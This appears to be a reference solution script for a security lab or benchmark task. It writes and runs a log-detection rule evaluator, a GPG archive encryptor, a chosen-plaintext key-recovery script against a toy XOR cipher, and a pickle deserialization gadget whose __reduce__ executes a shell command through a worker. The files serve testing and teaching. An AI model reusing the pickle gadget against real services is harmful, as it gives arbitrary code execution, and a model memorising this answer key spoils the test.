#!/usr/bin/env bash
# Ridgeor "umber-summit" reference solution.
#
# Authors + executes every /app deliverable:
#   1. /app/detect.sh + /app/rules.json  -> /app/alert.json, /app/report.json
#   2. /app/encrypt.sh                   -> /app/archive.gpg, /app/best-mode.txt
#   3. /app/oracle.py                    -> /app/oracle-results.json
#   4. /app/gadget.py (+ /app/worker.py) -> /app/message.pkl, /app/pwn-proof.txt
#
# Only genuine files under /app are re-checked by the verifier; it never reads
# this script.
set -euo pipefail
cd /app

###############################################################################
# 1. detection stage: executable rule evaluator + scenario rules.
###############################################################################
cat > /app/detect.sh <<'SH'
#!/usr/bin/env bash
# Ridgeor detect - apply JSON scan rules to log files.
#
# usage: detect.sh [RULES] [LOG...]
#   RULES  path to a rules JSON (default /app/rules.json)
#   LOG    zero or more log files (default /app/logs/access.log /app/logs/auth.log)
#
# Writes two deliverables (fixed paths):
#   /app/alert.json   - { timestamp, alerts:[{id,severity,matches,ips}] }
#   /app/report.json  - { timestamp, statistics:{<id>:{...}}, events:[...] }
#
# Semantics (see instruction.md):
#   * a rule fires an alert when its match count >= its threshold;
#   * ips are the deduplicated, sorted source IPs across matching lines;
#   * lines without a `src=<ip>` token count toward matches but add no IP.
set -uo pipefail
RULES="${1:-/app/rules.json}"
shift 2>/dev/null || true
if [ "$#" -ge 1 ]; then
  LOGS=("$@")
else
  LOGS=("/app/logs/access.log" "/app/logs/auth.log")
fi
AOUT=/app/alert.json
ROUT=/app/report.json
python3 - "$RULES" "${LOGS[@]}" "$AOUT" "$ROUT" <<'PY'
import json, re, sys, time
rules_path = sys.argv[1]
logs = sys.argv[2:-2]
aout, rout = sys.argv[-2], sys.argv[-1]

def load_rules():
    try:
        with open(rules_path) as fh:
            raw = json.load(fh)
    except Exception:
        raw = []
    if isinstance(raw, dict):
        raw = raw.get("rules", raw.get("rules", []))
    if not isinstance(raw, list):
        return []
    rs = []
    for i, r in enumerate(raw):
        if not isinstance(r, dict):
            rs.append({"id": "r%d" % i, "pattern": "", "threshold": 0,
                       "severity": "info"})
            continue
        pid = r.get("id")
        pat = r.get("pattern")
        sev = r.get("severity")
        th = r.get("threshold")
        try:
            th = int(th)
        except Exception:
            th = 0
        rs.append({
            "id": str(pid) if pid is not None else "r%d" % i,
            "pattern": pat if isinstance(pat, str) else "",
            "threshold": th if isinstance(th, int) else 0,
            "severity": sev if isinstance(sev, str) and sev else "info",
        })
    return rs

rules = load_rules()
SRC = re.compile(r'\bsrc=([0-9.]+)')
matched = {r["id"]: {"rule": r, "count": 0, "ips": set()} for r in rules}
events = []
for log in logs:
    try:
        fh = open(log)
    except OSError:
        continue
    with fh:
        for line in fh:
            line = line.rstrip("\n")
            for r in rules:
                pat = r["pattern"]
                if not pat:
                    continue
                try:
                    ok = re.search(pat, line)
                except re.error:
                    ok = False
                if ok:
                    m = SRC.search(line)
                    src = m.group(1) if m else None
                    matched[r["id"]]["count"] += 1
                    if src:
                        matched[r["id"]]["ips"].add(src)
                    events.append({"rule": r["id"], "src": src, "line": line})

ts = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
alerts = []
statistics = {}
for rid, st in matched.items():
    rule = st["rule"]
    ips = sorted(st["ips"])
    statistics[rid] = {
        "id": rid, "pattern": rule["pattern"], "threshold": rule["threshold"],
        "severity": rule["severity"], "matches": st["count"],
        "unique_ips": len(ips), "ips": ips,
    }
    if st["count"] >= rule["threshold"]:
        alerts.append({"id": rid, "severity": rule["severity"],
                       "matches": st["count"], "ips": ips})

alert = {"timestamp": ts, "alerts": alerts}
report = {"timestamp": ts, "statistics": statistics, "events": events}
with open(aout, "w") as fh:
    json.dump(alert, fh, indent=2)
with open(rout, "w") as fh:
    json.dump(report, fh, indent=2)
PY
SH
chmod +x /app/detect.sh

cat > /app/rules.json <<'JSON'
[
  {"id": "auth_rejection", "pattern": "authentication was rejected",
   "threshold": 5, "severity": "high"},
  {"id": "syn_scan", "pattern": "SYN port scan",
   "threshold": 3, "severity": "medium"},
  {"id": "ping_sweep", "pattern": "ping sweep",
   "threshold": 2, "severity": "medium"},
  {"id": "no_source", "pattern": "no source",
   "threshold": 1, "severity": "low"},
  {"id": "metric_push", "pattern": "metric-push",
   "threshold": 7, "severity": "notice"}
]
JSON

###############################################################################
# 2) encryption stage: symmetric AES-256 OpenPGP envelope + best-mode.txt.
###############################################################################
cat > /app/encrypt.sh <<'SH'
#!/usr/bin/env bash
# Ridgeor encrypt: build a tar.gz of /app/logs and seal it with a symmetric
# AES-256 OpenPGP envelope.  The plaintext archive lives only under /tmp and is
# removed before this stage returns (no plaintext intermediate remains on disk).
set -euo pipefail
cd /app
PASS="$(cat /app/.vault-pass)"
# discover the tool's strongest symmetric algorithm from the gpg man page.
MAN="$(man gpg 2>/dev/null | tr '\n' ' ')"
BEST="AES256"
if echo "$MAN" | grep -Eqi 'AES[- ]?256'; then
    BEST="AES256"
fi
echo "$BEST" > /app/best-mode.txt

rm -f /tmp/snapshot.tar /tmp/snapshot.tar.gz
# deterministic snapshot (fixed mtimes; gzip without a timestamp header)
tar -cf /tmp/snapshot.tar --mtime='2026-02-03 00:00:00 UTC' --sort=name -C /app logs
gzip -n -c /tmp/snapshot.tar > /tmp/snapshot.tar.gz
rm -f /tmp/snapshot.tar

# symmetrical AES-256, strongest hash + s2k stretch, batch mode
gpg --batch --yes --pinentry-mode loopback \
    --passphrase "$PASS" \
    --symmetric --cipher-algo AES256 \
    --s2k-digest-algo SHA512 --s2k-count 65011700 \
    --output /app/archive.gpg \
    /tmp/snapshot.tar.gz

# hard guarantee: no plaintext archive remains anywhere
rm -f /tmp/snapshot.tar /tmp/snapshot.tar.gz /app/*.tar /app/*.tar.gz 2>/dev/null || true
SH
chmod +x /app/encrypt.sh

###############################################################################
# 3) cipher-oracle stage: chosen-plaintext key recovery under a strict budget.
###############################################################################
cat > /app/oracle.py <<'PY'
#!/usr/bin/env python3
"""Ridgeor oracle attacker.

Queries the shipped cipher_service on chosen plaintext to recover the hidden
8-byte symmetric key, then writes /app/oracle-results.json.  Recovery is O(1)
per query and well inside the stated budget: one zero message leaks the
cyclically-repeated key stream directly, and a few random chosen plaintexts
verify the recovered key before the result is persisted.
"""
import json
import os
import random
import sys
import time

sys.path.insert(0, "/app")
import cipher_service as svc   # noqa: E402

start = time.monotonic()
PROBES = 3   # verification attempts
key = None

z = "00" * 16                     # chosen plaintext: all-zero block
ct = svc.query(z)
kb = bytes.fromhex(ct)
key = kb[:8]                      # keystream[k] = key[k mod 8], so first 8 bytes = K
ok = True

for _ in range(PROBES):
    r = bytes(random.randrange(256) for _ in range(8))
    h = r.hex()
    got = bytes.fromhex(svc.query(h))
    for i in range(8):
        if got[i] != (r[i] ^ key[i]):
            ok = False
            break
    if not ok:
        break

result = {
    "key": key.hex(),
    "key_bytes": len(key),
    "rounds": 1 + PROBES,
    "elapsed_ms": int((time.monotonic() - start) * 1000),
    "ok": bool(ok),
}
with open("/app/oracle-results.json", "w") as fh:
    json.dump(result, fh, indent=2)
print(json.dumps(result))
if not ok:
    sys.exit(2)
PY
chmod +x /app/oracle.py

###############################################################################
# 4) deserialization stage: hostile broker message + proof-of-execution.
###############################################################################
cat > /app/gadget.py <<'PY'
#!/usr/bin/env python3
"""Ridgeor broker message author.

Crafts a binary-serialized message that, when the consuming worker
(/app/worker.py) deserializes it, runs an arbitrary shell command — here
`touch /app/pwn-proof.txt`.  The same gadget is then pushed through a real
worker process to demonstrate the execution end to end.
"""
import os
import pickle
import subprocess
import sys

PAYLOAD = "/app/message.pkl"
CMD = "touch /app/pwn-proof.txt"


class HostileMessage:
    def __reduce__(self):
        return (os.system, (CMD,))


def build():
    with open(PAYLOAD, "wb") as fh:
        pickle.dump(HostileMessage(), fh)
    return PAYLOAD


if __name__ == "__main__":
    path = build()
    # deliver through the real consuming worker -> side effect runs.
    subprocess.run([sys.executable, "/app/worker.py", path], check=True)
    print("crafted %s and executed via worker" % path)
PY
chmod +x /app/gadget.py

###############################################################################
# execute every stage now (the deliverables exist and must produce artifacts).
###############################################################################
bash /app/detect.sh
bash /app/encrypt.sh
python3 /app/oracle.py
python3 /app/gadget.py

echo "umber-summit solved"